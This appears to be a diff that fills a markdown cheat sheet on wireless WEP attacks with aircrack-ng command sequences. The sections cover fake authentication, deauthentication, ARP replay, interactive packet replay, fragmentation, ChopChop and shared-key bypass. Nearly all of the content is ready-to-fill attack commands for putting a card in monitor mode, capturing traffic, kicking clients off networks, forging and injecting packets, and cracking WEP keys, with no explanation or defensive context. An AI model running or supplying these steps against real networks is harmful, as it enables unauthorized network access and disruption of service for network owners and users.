@@ -1,15 +1,58 @@
 
 ## Fake Authentication Attack
-
+   
+     airmon-ng start <interface> <AP channel>
+     airodump-ng -c <AP Channel> --bssid <AP MAC> -w <capture> <interface>
+   # aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface name>
+   
+   
 ## Deauthentication Attack
+
+     airmon-ng start <interface> <AP channel>
+     airodump-ng -c <AP Channel> --bssid <AP MAC> -w <capture> <interface>
+   # aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface name>
+
 
 ## ARP Request Replay Attack
 
+   airmon-ng start <interface> <AP channel>
+   airodump-ng -c <AP Channel> --bssid <AP MAC> -w <capture> <interface>
+   aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface>
+   aireplay-ng -3 -b <AP MAC> -h <Your MAC> <interface>
+   aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
+   aircrack-ng <capture>
+ 
+
 ## Interactive Packet Replay Attack
+
+   airmon-ng start <interface> <AP channel>
+   airodump-ng -c <AP Channel> --bssid <AP MAC> -w <capture> <interface>
+   aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface>
+   aireplay-ng -3 -b <AP MAC> -h <Your MAC> <interface>
+   aireplay-ng -2 -b <AP MAC> -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 <interface>
+   aircrack-ng -z <capture>
+
 
 ## Fragmentation Attack
 
+   airmon-ng start <interface> <AP channel>
+   airodump-ng -c <AP Channel> --bssid <AP MAC> -w <capture> <interface>
+   aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface>
+   aireplay-ng -5 -b <AP MAC> -h <Your MAC> <interface>
+   packetforge-ng -0 -a <AP MAC> -h <Your MAC> -l <Source IP> -k <Dest IP> -y <xor filename> -w <output filename>
+   aireplay-ng -2 -r <packet filename> <interface>
+   aircrack-ng <capture>
+   
+
 ## Korek ChopChop Attack
+
+   airmon-ng start <interface> <AP channel>
+   airodump-ng -c <AP Channel> --bssid <AP MAC> -w <capture> <interface>
+   aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface>
+   aireplay-ng -4 -b <AP MAC> -h <Your MAC> <interface>
+   packetforge-ng -0 -a <AP MAC> -h <Your MAC> -l <Source IP> -k <Dest IP> -y <xor filename> -w <output filename>
+   aireplay-ng -2 -r <packet filename> <interface>
+   aircrack-ng <capture>
 
 ## Aircrak-ng
 
@@ -17,6 +60,16 @@
 ## Bypassing WEP Shared Key Authentication
 
    Attack Steps;
+   
+   airmon-ng start <interface> <AP channel>
+   airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
+   aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
+   aireplay-ng -1 0 -e <ESSID> -y <keystream file> -a <AP MAC> -h <Your MAC> <interface>
+   aireplay-ng -3 -b <AP MAC> -h <Your MAC> <interface>
+   aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
+   aircrack-ng <capture>
+   
+   
    
    
 
